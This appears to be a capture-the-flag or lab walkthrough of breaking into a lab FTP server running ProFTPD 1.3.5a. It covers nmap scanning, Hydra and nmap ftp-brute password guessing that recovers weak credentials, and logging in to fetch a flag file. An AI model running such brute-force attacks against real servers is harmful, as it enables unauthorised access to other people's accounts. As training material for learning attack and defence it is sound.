# Checking if FTP port state,service  and its version,  we observe that there is Pro FTP daemon which is a highly feature rich FTP server for Unix-like environments that exposes many configuration options. 

root@attackdefense:~# `nmap 192.60.4.3 -p 21` 
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-07 04:49 UTC
Nmap scan report for target-1 (192.60.4.3)
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:C0:3C:04:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
root@attackdefense:~# `nmap 192.60.4.3 -sV -p 21`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-07 04:49 UTC
Nmap scan report for target-1 (192.60.4.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:3C:04:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds

# Trying to connect File Server using blank password,  we observe that it isnt allowed

root@attackdefense:~# `ftp 192.60.4.3 `   
Connected to 192.60.4.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.60.4.3]
Name (192.60.4.3:root): 
331 Password required for root
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> `ls`
530 Please login with USER and PASS
ftp: bind: Address already in use
ftp> `bye`
221 Goodbye.

# Trying to get username and password by bruteforce using Hydra, we found many user and pass

root@attackdefense:/# `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.60.4.3 ftp`
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-07 05:07:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://192.60.4.3:21/
[21][ftp] host: 192.60.4.3   login: sysadmin   password: 654321
[21][ftp] host: 192.60.4.3   login: rooty   password: qwerty
[21][ftp] host: 192.60.4.3   login: demo   password: butterfly
[21][ftp] host: 192.60.4.3   login: auditor   password: chocolate
[21][ftp] host: 192.60.4.3   login: anon   password: purple
[21][ftp] host: 192.60.4.3   login: administrator   password: tweety
[21][ftp] host: 192.60.4.3   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-07 05:08:36


# We can also do brute force using nmap script, we obseve we are able to get password with known username list

root@attackdefense:/# `echo "sysadmin" > users`
root@attackdefense:/# `ls`
0  bin  boot  dev  etc  home  lib  lib32  lib64  media  mnt  opt  proc  root  run  sbin  secret.txt  sers  srv  startup.sh  sys  tmp  users  usr  var
root@attackdefense:/# `nmap 192.60.4.3 --script ftp-brute --script-args userdb=/users -p 21`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-07 05:23 UTC
Nmap scan report for target-1 (192.60.4.3)
Host is up (0.000060s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: 
|     sysadmin:654321 - Valid credentials
|_  Statistics: Performed 25 guesses in 5 seconds, average tps: 5.0
MAC Address: 02:42:C0:3C:04:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.36 seconds

# We now have username and password to authenticate to FTP server, we observe that there is a secret.txt which we can get

root@attackdefense:/# `ftp 192.60.4.3`       
Connected to 192.60.4.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.60.4.3]
Name (192.60.4.3:root): `sysadmin`
331 Password required for sysadmin
Password:
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> `ls`
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> `get secret.txt`
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (473.9200 kB/s)
ftp> `bye`
221 Goodbye.
root@attackdefense:/# `ls`
0  bin  boot  dev  etc  home  lib  lib32  lib64  media  mnt  opt  proc  root  run  sbin  secret.txt  srv  startup.sh  sys  tmp  usr  var
root@attackdefense:/# `cat secret.txt`
260ca9dd8a4577fc00b7bd5810298076

